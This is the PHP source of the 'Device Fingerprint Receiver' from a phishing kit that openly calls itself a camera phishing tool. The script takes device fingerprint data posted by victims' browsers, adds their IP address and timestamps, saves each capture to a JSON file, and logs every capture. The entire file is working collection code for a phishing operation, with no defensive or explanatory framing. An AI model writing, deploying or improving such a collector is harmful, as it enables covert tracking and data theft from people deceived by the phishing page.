<?php
/**
 * CamPhish - Advanced Camera Phishing Tool
 * Device Fingerprint Receiver
 * 
 * @author     Rahul Kushwaha
 * @github     https://github.com/raahulllkushwaha
 * @repository https://github.com/raahulllkushwaha/Cam-Phisher
 * @license    GNU General Public License v3.0
 */

// Set JSON content type header
header('Content-Type: application/json');

// Create fingerprints directory if it doesn't exist
$fingerprintDir = 'fingerprints';
if (!is_dir($fingerprintDir)) {
    mkdir($fingerprintDir, 0755, true);
}

// Get JSON data from POST body
$jsonData = file_get_contents('php://input');
$fingerprint = json_decode($jsonData, true);

if ($fingerprint && is_array($fingerprint)) {
    // Get client IP address with validation
    $ipAddress = '';
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        $ipAddress = $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        // Take only the first IP in case of multiple forwarded IPs
        $forwardedIps = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        $ipAddress = trim($forwardedIps[0]);
    } else {
        $ipAddress = $_SERVER['REMOTE_ADDR'];
    }
    // Validate IP format and sanitize
    if (!filter_var($ipAddress, FILTER_VALIDATE_IP)) {
        $ipAddress = 'Invalid';
    }

    // Add IP address and timestamp
    $fingerprint['ipAddress'] = $ipAddress;
    $fingerprint['timestamp'] = date('Y-m-d H:i:s');
    $fingerprint['unixTimestamp'] = time();

    // Generate filename with timestamp
    $timestamp = date('YmdHis');
    $filename = $fingerprintDir . '/fp_' . $timestamp . '.json';

    // Save fingerprint data
    $saved = file_put_contents($filename, json_encode($fingerprint, JSON_PRETTY_PRINT));

    if ($saved !== false) {
        // Create marker log file
        file_put_contents('FingerprintLog.log', "Fingerprint captured at " . date('Y-m-d H:i:s') . "\n", FILE_APPEND);

        echo json_encode([
            'status' => 'success',
            'message' => 'Fingerprint data received'
        ]);
    } else {
        echo json_encode([
            'status' => 'error',
            'message' => 'Could not save fingerprint data'
        ]);
    }
} else {
    echo json_encode([
        'status' => 'error',
        'message' => 'Invalid or missing fingerprint data'
    ]);
}

exit();
?>
